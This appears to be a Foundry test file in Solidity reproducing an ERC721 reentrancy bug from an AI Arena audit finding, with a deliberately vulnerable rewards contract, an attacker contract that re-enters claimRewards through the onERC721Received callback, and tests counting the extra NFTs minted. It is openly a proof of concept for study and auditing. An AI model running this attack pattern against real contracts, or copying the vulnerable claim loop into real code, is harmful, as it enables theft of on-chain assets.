// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

/// @title ERC721 Callback Reentrancy PoC
/// @notice Demonstrates reentrancy via onERC721Received during reward claiming
/// @dev Based on AI Arena 2024-02 (Code4rena H-830)

contract SimpleNFT is ERC721 {
    uint256 public nextId;

    constructor() ERC721("TestNFT", "TNFT") {}

    function mint(address to) external returns (uint256) {
        uint256 id = nextId++;
        _safeMint(to, id); // triggers onERC721Received
        return id;
    }
}

contract VulnerableRewards {
    SimpleNFT public nft;
    mapping(address => uint32) public numRoundsClaimed;
    mapping(address => uint32) public totalRewards;

    constructor(SimpleNFT _nft) {
        nft = _nft;
    }

    function setRewards(address user, uint32 rounds) external {
        totalRewards[user] = rounds;
    }

    function claimRewards() external {
        uint32 lowerBound = numRoundsClaimed[msg.sender];
        for (uint32 i = lowerBound; i < totalRewards[msg.sender]; i++) {
            numRoundsClaimed[msg.sender] += 1;
            nft.mint(msg.sender); // ❌ external call before loop completes
        }
    }
}

contract ERC721Attacker {
    VulnerableRewards public target;
    uint256 public mintCount;

    constructor(VulnerableRewards _t) {
        target = _t;
    }

    function attack() external {
        target.claimRewards();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        mintCount++;
        // Re-enter if there are still unclaimed rewards
        if (target.numRoundsClaimed(address(this)) < target.totalRewards(address(this))) {
            target.claimRewards();
        }
        return this.onERC721Received.selector;
    }
}

contract ERC721CallbackReentrancyTest is Test {
    SimpleNFT nft;
    VulnerableRewards rewards;
    ERC721Attacker attacker;

    function setUp() public {
        nft = new SimpleNFT();
        rewards = new VulnerableRewards(nft);
        attacker = new ERC721Attacker(rewards);
    }

    function testReentrancyWith2Rewards() public {
        rewards.setRewards(address(attacker), 2);
        attacker.attack();
        // 2 rewards should yield 3 NFTs via reentrancy
        assertEq(attacker.mintCount(), 3, "2 rewards -> 3 mints via reentrancy");
    }

    function testReentrancyWith3Rewards() public {
        rewards.setRewards(address(attacker), 3);
        attacker.attack();
        // 3 rewards should yield 6 NFTs (exponential amplification)
        assertEq(attacker.mintCount(), 6, "3 rewards -> 6 mints via reentrancy");
    }

    function testNoReentrancyWith1Reward() public {
        rewards.setRewards(address(attacker), 1);
        attacker.attack();
        assertEq(attacker.mintCount(), 1, "1 reward -> 1 mint (no reentrancy)");
    }
}
